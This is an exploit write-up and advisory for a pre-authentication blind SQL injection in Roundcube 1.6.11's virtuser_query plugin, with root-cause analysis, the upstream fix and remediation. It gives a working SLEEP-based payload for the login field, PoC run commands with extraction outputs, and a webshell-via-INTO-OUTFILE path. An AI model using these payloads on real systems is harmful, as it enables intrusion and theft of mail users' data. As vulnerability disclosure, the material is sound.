# Roundcube 1.6.11 — Pre-Authentication Blind SQL Injection (CVE-2026-48842)

**Exploit write-up and proof-of-concept**
**Target:** Roundcube Webmail 1.6.11 (PHP 8.3.36)
**Class:** CWE-89 (SQL Injection) — pre-authentication
**Severity:** High (data disclosure); conditional RCE via `INTO OUTFILE`
**Status:** Fixed upstream in 1.7.1; 1.6.11 is end-of-life

> **Disclaimer:** This document is provided for authorized security testing,
> bug-bounty work, and defensive research only. Do not use it against systems
> you do not own or have explicit written permission to test.

---

## 1. Executive Summary

Roundcube 1.6.11's `virtuser_query` plugin builds SQL queries with
`preg_replace()` and passes user-controlled data through the *replacement*
argument. PHP interprets backslashes in a `preg_replace()` replacement, which
collapses the escaping performed by `$dbh->escape()` and allows SQL injection.

The vulnerable query is reached **before authentication**: `rcmail::login()`
calls `rcube_user::email2user()` for any login name containing `@`, which
invokes the plugin's `email2user` hook. No valid account is required.

The supplied PoC (`poc_preauth_sqli_roundcube_1611.py`) confirms the injection
with a time-based oracle and extracts arbitrary SQL expressions — for example
the database version (`8.0.46`) or database name (`roundcube`) — character by
character using binary search.

**Key point:** the injection itself is unauthenticated, but exploitation
requires the `virtuser_query` plugin to be enabled with a `user` (`%m`) query.
It is **not** enabled by default in a stock 1.6.11 installation.

---

## 2. Affected Versions

| Item | Value |
|---|---|
| Vulnerable | Roundcube **1.6.11** and earlier 1.6.x; 1.7.0 (with the plugin enabled) |
| Fixed | 1.7.1 (single-pass placeholder replacement) |
| Component | `plugins/virtuser_query/virtuser_query.php` |
| Authentication | **None** (pre-auth) |
| Default exploitability | Plugin disabled by default; requires configuration |

The 1.6 branch ended with 1.6.11. It does not receive the 2026 security fixes,
including CVE-2026-48842.

---

## 3. Root Cause

### 3.1 Pre-auth call path

`program/include/rcmail.php` (~line 755):

```php
// try to resolve email address from virtuser table
if (strpos($username, '@') && ($virtuser = rcube_user::email2user($username))) {
    $username = $virtuser;
}
```

`rcube_user::email2user()` executes the `email2user` plugin hook, which is
provided by `virtuser_query` when a `user` query is configured.

### 3.2 Vulnerable query construction

`plugins/virtuser_query/virtuser_query.php` (1.6.11):

```php
public function email2user($p)
{
    $dbh = $this->get_dbh();

    $sql_result = $dbh->query(
        preg_replace('/%m/', $dbh->escape($p['email']), $this->config['user'])
    );
    ...
}
```

`$dbh->escape()` correctly escapes quotes and backslashes for the database.
However, the escaped value is used as the **replacement** argument of
`preg_replace()`. PHP interprets backslashes in that argument
(`\\` becomes `\`), so the escaping is undone before the query reaches MySQL.

### 3.3 Upstream fix (1.7.1)

The fixed code performs a single, literal replacement:

```php
$sql_result = $dbh->query(
    str_replace('%m', $dbh->escape($p['email']), $this->config['user'])
);
```

`str_replace()` does not interpret backslashes in the replacement, so the
database sees exactly the escaped value.

---

## 4. Attack Flow

1. **Fetch the login page** and extract the CSRF token (`_token`).
2. **Submit the login form** with an injected `_user` value:
   ```
   test@example.com\' AND IF(<condition>,SLEEP(2),1)-- -
   ```
3. `rcmail::login()` sees `@`, calls `email2user`, and the plugin executes the
   injected SQL **before any authentication check**.
4. **Measure the response time.** A true condition triggers `SLEEP(2)`; a false
   condition returns immediately.
5. **Binary search** over `LENGTH()` and `ASCII(SUBSTRING(...))` to extract any
   SQL expression.
6. `-- -` comments out the trailing quote from the original query.

The `IF(condition, SLEEP(n), 1)` form is deliberate: on a false condition it
returns `1`, so the query still returns a row and the application does not add
its own failed-login `sleep(1)` delay. This keeps the timing signal clean.

---

## 5. Requirements

### 5.1 Target requirements

- Roundcube **1.6.11** (or another release before the 1.7.1 fix).
- The `virtuser_query` plugin **enabled** and configured with a `user` query,
  for example:
  ```php
  $config['plugins'] = ['virtuser_query'];
  $config['virtuser_query'] = [
      'user' => "SELECT username FROM users WHERE username = '%m'"
  ];
  ```
- The login name must contain `@` (otherwise `email2user` is not called).
- HTTP/HTTPS access to the login page.

### 5.2 Attacker requirements

- Python **3.8+**; the PoC uses only the standard library.
- Network access to the target.
- **No credentials.** The password is irrelevant to triggering the query; a
  failed login adds a fixed 1-second delay that the oracle handles.
- For high-latency links, use `--sleep 5` and `--timeout 120`.

### 5.3 Query-shape requirement

The default payload assumes the configured query ends with a string comparison
such as:

```sql
SELECT username FROM users WHERE username = '%m'
```

If the target uses a different query shape, the payload and the `--user`
value must be adapted accordingly.

> The plugin is **disabled by default** in 1.6.11. A target without the plugin
> configured is not vulnerable to this issue.

---

## 6. Lab Environment

The lab used for validation:

| Component | Version |
|---|---|
| Roundcube | 1.6.11 |
| PHP | 8.3.36 (Apache) |
| MySQL | 8.0.46 |
| GreenMail | 2.1.0 (IMAP/SMTP, auth disabled for the lab) |
| Redis | 7 (session storage, for the separate deserialization finding) |

Start:

```powershell
docker compose -f lab/docker-compose.yml up -d --build
docker cp lab/mysql1611.initial.sql lab-db-1:/tmp/init1611.sql
docker exec lab-db-1 sh -c 'mysql -uroot -prootpw roundcube < /tmp/init1611.sql'
python lab/login_test.py
```

The login page reports `rcversion:10611`, confirming 1.6.11.

---

## 7. Running the PoC

**File:** `poc_preauth_sqli_roundcube_1611.py`

### 7.1 Interactive (asks for the target)

```bash
python poc_preauth_sqli_roundcube_1611.py
# Target URL (e.g. http://127.0.0.1:8080): http://127.0.0.1:8080
```

### 7.2 Non-interactive

```bash
python poc_preauth_sqli_roundcube_1611.py \
  --url http://127.0.0.1:8080 \
  --sleep 2
```

### 7.3 Extract a different expression

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 \
  --expr "SELECT DATABASE()"

python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 \
  --expr "SELECT USER()"

python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 \
  --expr "(SELECT username FROM users LIMIT 1)"
```

### 7.4 Full error output

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://TARGET --debug
```

`--debug` prints the complete traceback, HTTP status, final URL, and response
body for every failure.

### 7.5 Options

| Option | Default | Description |
|---|---|---|
| `--url` | prompt | Base URL of the Roundcube instance |
| `--user` | `test@example.com` | Login name; must contain `@` |
| `--password` | `test` | Any password (authentication is not the signal) |
| `--sleep` | `2` | `SLEEP()` seconds used by the oracle |
| `--threshold` | `max(1.0, sleep*0.6)` | Required delay delta over the calibrated baseline |
| `--timeout` | `60` | Per-request HTTP timeout |
| `--expr` | `SELECT VERSION()` | SQL expression to extract |
| `--debug` | off | Print tracebacks and full response bodies |

### 7.6 Exit codes

| Code | Meaning |
|---|---|
| `0` | Vulnerable; expression extracted successfully |
| `1` | No reliable delay (patched, plugin disabled, different query, or too slow) |
| `2` | Hard error (connection, no login form, unexpected exception) |

---

## 8. Example Runs and Outputs

### 8.1 Database version (default `--expr`)

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 --sleep 2
```

```
[*] target       : http://127.0.0.1:8080
[*] login name   : test@example.com
[*] sleep        : 2s (required delta/margin 1.20s)
[*] baseline 1   : status=200 time=0.44s
[*] baseline 2   : status=200 time=0.43s
[*] baseline 3   : status=200 time=0.34s
[*] baseline med : 0.43s
[*] sleep test   : status=200 time=2.45s
[*] delta        : +2.02s (required 1.20s)
[+] VULNERABLE: blind SQL injection confirmed (delta +2.02s)
[*] extracting value length ...
[*] length       : 6
[*] extracting value ...
[*] extracting   : 8.0.46
[+] extracted    : 8.0.46
[*] requests     : 48
```

`SELECT VERSION()` in the lab returns `8.0.46`; the PoC extracts exactly the
same value through the injection.

### 8.2 Database name (`--expr "SELECT DATABASE()"`)

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 \
  --sleep 2 --expr "SELECT DATABASE()"
```

```
[*] baseline 1   : status=200 time=0.49s
[*] baseline 2   : status=200 time=0.30s
[*] baseline 3   : status=200 time=0.31s
[*] baseline med : 0.31s
[*] sleep test   : status=200 time=2.61s
[*] delta        : +2.29s (required 1.20s)
[+] VULNERABLE: blind SQL injection confirmed (delta +2.29s)
[*] length       : 9
[*] extracting   : roundcube
[+] extracted    : roundcube
[*] requests     : 71
```

### 8.3 No reliable delay (correct rejection)

If the measured delta is below the margin, the PoC stops instead of producing
a false positive:

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080 \
  --sleep 2 --threshold 3.0
```

```
[*] baseline 1   : status=200 time=0.40s
[*] baseline 2   : status=200 time=0.32s
[*] baseline 3   : status=200 time=0.38s
[*] baseline med : 0.38s
[*] sleep test   : status=200 time=2.40s
[*] delta        : +2.02s (required 3.00s)
[-] no reliable delay (delta +2.02s < 3.00s). Target may be patched,
    virtuser_query disabled, the SQL query differs, or the link is too slow
    - try --sleep 5.
exit=1
```

### 8.4 Full error output (`--debug`)

```bash
python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:9 --debug
```

```
[*] target       : http://127.0.0.1:9
[*] login name   : test@example.com
[*] sleep        : 2s (required delta/margin 1.20s)
[!] baseline request failed:
    status      : -1
    final url   : http://127.0.0.1:9
    error       : login page request failed: URLError: <urlopen error
                  [WinError 10061] connection refused>
    body        : 'Traceback (most recent call last): ...'
[!] ERROR: cannot reach the login page: login page request failed: ...
    status      : -1
    url         : http://127.0.0.1:9
[traceback]
Traceback (most recent call last):
  ...
PocError: cannot reach the login page: ...
```

The exact error, status, URL, body, and traceback are printed; failures are
never silently swallowed.

### 8.5 High-latency false positive (old build) and the fix

An earlier build compared the injected request time against a **fixed** 1.8 s
threshold. On a slow link this produced:

```
[*] baseline     : status=401 time=6.13s
[*] sleep test   : status=401 time=7.19s
[*] delta        : +1.05s
[+] VULNERABLE: ...
[*] length       : 64
[*] extracting   : ~
```

Every response exceeded 1.8 s, so the oracle answered "true" to every
question: length hit the maximum (64) and the binary search converged to `~`
(ASCII 126). That was a **false positive**, not a finding.

The current PoC fixes this by:

- calibrating the baseline with **three samples** and using the median;
- requiring a **delta** of `max(1.0, sleep*0.6)` over that baseline;
- capping the extracted length at **32** and aborting if the length is invalid;
- aborting if the result contains only `~`/spaces or non-printable characters.

On a high-latency target, rerun with `--sleep 5 --timeout 120` to make the
`SLEEP()` signal larger than the network jitter.

---

## 9. How the Oracle Works

### 9.1 Baseline calibration

Three clean login requests are measured; the **median** is used as the
baseline. This prevents a single slow response from shifting the threshold.

### 9.2 Delta threshold

```
margin = max(1.0, sleep * 0.6)
true   = elapsed >= baseline_median + margin
```

With `--sleep 2`, a true condition adds ~2 s over the baseline, while a false
condition returns at baseline speed.

### 9.3 Binary search

- `LENGTH((<expr>))` is extracted with a binary search (1..32).
- Each character is extracted with `ASCII(SUBSTRING((<expr>),pos,1))` over the
  printable range 32..126.
- A `SLEEP()`-based oracle is used for each comparison.

This requires roughly `log2(32) + len * log2(94)` requests (48 requests for a
6-character version, 71 for a 9-character database name).

### 9.4 Safety checks

- Length `>= 32` or `< 1` → abort: the oracle is unreliable.
- Result is only `~`/spaces or contains non-printable characters → abort.
- No reliable delay on the sanity check → abort with exit code 1.

---

## 10. Impact

### 10.1 Pre-authentication database read

The injected `SELECT` executes with the privileges of the Roundcube database
user. An attacker can read:

- `users` (usernames, mail hosts, preferences),
- `identities` (email addresses, signatures, BCC),
- `contacts` / `contactgroups`,
- `session` (encrypted IMAP credentials, if database sessions are used),
- `cache` and other application tables.

### 10.2 Username resolution

`email2user` returns the first column of the injected query, so a `UNION SELECT`
can make Roundcube resolve an arbitrary username. Authentication still depends
on the IMAP password, so this is not a standalone account takeover — but it is
a useful primitive when combined with weak/reused passwords or a compromised
mail account.

### 10.3 Conditional RCE

If the database user has the `FILE` privilege and `secure_file_priv` permits
the target path, a `UNION SELECT ... INTO OUTFILE` can write a PHP webshell
into a web-accessible directory on the database host. This requires:

- `FILE` privilege for the Roundcube DB user,
- a permissive `secure_file_priv`,
- the webroot on the same filesystem as the MySQL server.

In the lab these conditions were not present (no `FILE`, restricted
`secure_file_priv`), so only the SQL injection and data extraction were
demonstrated.

### 10.4 End-of-life

Roundcube 1.6.11 is the final 1.6 release. It does not receive the 2026
security fixes (including CVE-2026-48842). The 1.6 branch is unsupported.

---

## 11. Remediation

1. **Upgrade** to a patched release (>= 1.7.1; preferably the latest stable
   release). The 1.6 branch is end-of-life.
2. **Backport** the fix if upgrading is not possible: replace
   `preg_replace('/%m/', ...)` with `str_replace('%m', ...)` (and the same for
   `%u` in the other query paths).
3. **Disable the plugin** if it is not required:
   ```php
   $config['plugins'] = [];   // remove 'virtuser_query'
   ```
4. **Restrict the database user**: no `FILE` privilege; set
   `secure_file_priv` to a dedicated directory; do not run MySQL with broad
   filesystem access.
5. **Defense in depth**: rate-limit login attempts, deploy a WAF rule for
   backslash/quote patterns in `_user`, and monitor SQL errors.

---

## 12. Troubleshooting

| Symptom | Likely cause | Action |
|---|---|---|
| `status=401` on baseline | Invalid login credentials | Normal; the SQLi still executes. Use any password. |
| Baseline > 3 s | High latency / proxy | Rerun with `--sleep 5 --timeout 120`. |
| `no reliable delay` | Patched, plugin disabled, different query, or too slow | Verify the version and plugin; try `--sleep 5`. |
| `length looks invalid` | Oracle unreliable | The PoC aborts; do not treat as a finding. |
| `extracted` is only `~` | Oracle always true | The PoC aborts; target likely not vulnerable. |
| `login form token not found` | Wrong URL or not Roundcube | Check the base URL; use `--debug` for the response body. |
| Connection error | Wrong host/port or firewall | `--debug` prints the full exception and traceback. |
| `--user` without `@` | `email2user` not called | Use a login name containing `@`. |

---

## 13. References

- **CVE-2026-48842** — Roundcube 1.7.1 changelog:
  “Fix pre-auth SQL injection in `virtuser_query` plugin via preg_replace
  backslash escape bypass.”
- `plugins/virtuser_query/virtuser_query.php` (1.6.11) — vulnerable query.
- `program/include/rcmail.php` (~line 755) — pre-auth `email2user` call.
- `program/lib/Roundcube/rcube_user.php` — `email2user()` implementation.
- PoC: `poc_preauth_sqli_roundcube_1611.py`
- Lab: `lab/docker-compose.yml`, `lab/README.md`
